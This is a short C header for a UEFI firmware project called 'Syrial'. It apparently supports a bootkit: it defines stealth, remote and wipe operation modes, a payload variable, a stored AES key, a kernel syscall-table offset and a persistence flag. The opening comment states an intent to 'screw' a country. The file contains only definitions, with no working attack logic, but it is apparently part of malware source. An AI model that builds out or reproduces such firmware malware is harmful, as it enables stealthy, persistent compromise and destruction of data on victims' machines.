// From here you can screw your fucking country.
#ifndef SYRIAL_SHARED_DEFS_H
#define SYRIAL_SHARED_DEFS_H

#include <Uefi.h>

//
// General GUIDs 
//
#define SYRIAL_VAR_GUID \
  { 0xa45fbfdb, 0x41f3, 0x4377, { 0xa4, 0x92, 0xd8, 0xf5, 0x6e, 0x41, 0x7a, 0x2b } }

extern EFI_GUID SyrialGuid;

#define SYRIAL_MAX_LOG_SIZE     4096
#define SYRIAL_VAR_NAME         L"\\SyrialLog"
#define SYRIAL_PAYLOAD_NAME     L"\\SyrialPayload"
#define SYRIAL_KEY_VAR_NAME     L"SyrialKeyBlob"
#define SYRIAL_COMM_BUFFER_SIZE 512

typedef enum {
    SYRIAL_MODE_STEALTH = 0,
    SYRIAL_MODE_DEBUG   = 1,
    SYRIAL_MODE_REMOTE  = 2,
    SYRIAL_MODE_WIPE    = 3
} SYRIAL_OPERATION_MODE;

typedef struct {
    CHAR8   ID[8];               
    UINT64  KernelBaseHint;      
    UINT64  SyscallTableOffset;  
    UINT8   AESKey[32];          
    UINT32  ActiveMode;          // SYRIAL_OPERATION_MODE
    BOOLEAN Persisted;           
} SYRIAL_RUNTIME_CONTEXT;

//
// Macros
//
#define ZeroMemory(Destination, Length) \
    SetMem((Destination), (Length), 0)

#endif 
